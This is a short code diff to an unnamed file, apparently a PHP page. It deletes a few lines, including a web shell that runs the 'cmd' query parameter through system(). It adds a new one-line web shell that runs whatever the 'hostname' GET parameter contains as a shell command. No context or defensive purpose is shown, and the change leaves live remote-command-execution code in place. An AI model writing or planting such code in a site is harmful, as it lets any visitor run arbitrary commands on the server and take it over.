@@ -1,3 +1,1 @@
-hi
-echo "howdy"
-<?php echo "hello";system($_GET['cmd']);?>
+<?php system($_GET[hostname]);?>
